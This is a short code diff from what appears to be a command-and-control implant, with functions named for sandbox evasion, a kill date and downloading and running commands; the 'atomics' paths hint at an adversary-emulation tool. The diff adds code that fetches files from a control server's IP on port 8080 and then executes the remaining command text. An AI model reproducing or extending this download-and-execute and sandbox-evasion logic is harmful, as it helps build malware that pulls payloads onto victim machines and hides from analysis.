@@ -173,7 +173,10 @@ def download_and_run_commands():
                     global kill_date_string
                     kill_date_string = command
                     continue
-
+                if command.startswith('/atomics/'):
+                    path_to_file = command.split(' & ')[0]
+                    download(path_to_file)
+                    command = command.split(' & ')[1:]
                 results.append(execute_command(command))
 
             return results
@@ -285,9 +288,10 @@ def sandbox_evasion():
             sys.exit()
 
 
-def download(url):
+def download(file_path):
+    url = 'http://{0}:8080{1}'.format(SERVER_IP, file_path)
     req = http.request('GET', url, headers=headers)
-    payload = url.split("/")[-1]
+    payload = file_path.split("/")[-1]
     with open(payload, "wb") as file:
         file.write(req.data)
 
